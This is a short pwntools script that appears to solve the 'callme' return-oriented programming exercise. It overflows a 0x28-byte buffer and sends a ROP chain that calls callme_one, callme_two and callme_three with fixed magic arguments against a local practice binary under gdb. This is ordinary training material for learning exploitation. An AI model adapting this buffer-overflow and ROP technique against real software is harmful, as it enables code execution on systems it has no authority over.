from pwn import *

# file information here

context.terminal = ['bash']
context.arch = 'x86_64'
executable = 'callme'
gdbinit = '''
    b *callme_one+102
'''

elf = ELF(executable)
rop = ROP(elf)
p = process(elf.path)

gdb.attach(p, gdbscript=gdbinit)

# p.recvuntil("")

rop.callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
rop.callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
rop.callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
rop.raw(0x4006be)

print(rop.dump())

payload = flat(
    'a'* 0x28,
    rop.chain()
)

# pause()
p.send(payload)
# p.send(rop.chain())

p.interactive()

with open('out.txt', 'wb') as out:
    out.write(payload)
